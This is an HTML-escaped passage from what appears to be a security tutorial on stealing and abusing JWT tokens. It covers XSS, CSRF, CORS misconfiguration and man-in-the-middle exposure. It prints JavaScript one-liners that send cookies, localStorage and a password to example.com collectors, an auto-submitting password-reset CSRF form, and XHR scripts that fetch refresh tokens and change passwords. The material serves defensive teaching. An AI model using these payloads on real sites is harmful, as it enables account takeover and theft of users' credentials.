+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://example.com/cookiestealer.php?c=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;or&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Image&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://example.com/log.php?localStorage=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;(window[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localStorage&amp;#39;&lt;/span&gt;]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;or&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://example.com/?password=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;secretPasswordVariable&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;32---csrf&#34;&gt;3.2 - CSRF&lt;/h3&gt;
+&lt;p&gt;JWT tokens stored in cookies (whether they are HTTPOnly or not) will be automatically sent by the browser when an authenticated user interacts with the target site. When a victim triggers a CSRF payload the browser will send the associated cookies including the token. The attacker won&amp;rsquo;t be able to see these, but as they are being used to do the attacker&amp;rsquo;s bidding that doesn&amp;rsquo;t really matter.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;autosubmit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.example.com/account/passwordreset&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enctype=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/plain&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;victim1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BadGuyKnowsThis!&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Submit Request&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.getElementById(&amp;#34;autosubmit&amp;#34;).submit();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;33---cors-misconfiguration&#34;&gt;3.3 - CORS Misconfiguration&lt;/h3&gt;
+&lt;p&gt;When a site&amp;rsquo;s CORS policy allows arbitrary origins as well as sending credentials it is possible to craft an attack page containing an XHR request to the webserver, while also capturing the response.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;This leads to two possible attack paths:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;If the JWT is returned in any HTTP responses from the application, the token can be read by the attacker when the &amp;rsquo;trigger&amp;rsquo; request is sent. A good example of this is a JWT &amp;lsquo;refresh token&amp;rsquo; or queries to an account page or login page.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;If the JWT is sent in a cookie then CORS can be used as a type of CSRF to send the token without the attacker needing to see it.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Example - XHR CORS:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.avictimwebsitewithJWTcookieauth.com/api/refreshtoken&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;withCredentials&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json;charset=UTF-8&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Example - XHR CSRF:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.avictimwebsitewithJWTcookieauth.com/api/passwordreset&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;withCredentials&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json;charset=UTF-8&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;newpass&amp;#34;:&amp;#34;BadGuyKnowsThis!&amp;#34;}&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;34---man-in-the-middle&#34;&gt;3.4 - Man-in-the-Middle&lt;/h3&gt;
+&lt;p&gt;JWTs may also be seen in captured HTTP traffic, either in the header/body of unencrypted traffic, in log files of firewalls/gateways/other servers, in referrer links (if exposed as a URL parameter), or a range of other places.&lt;/p&gt;
 </content>
     </item>
     
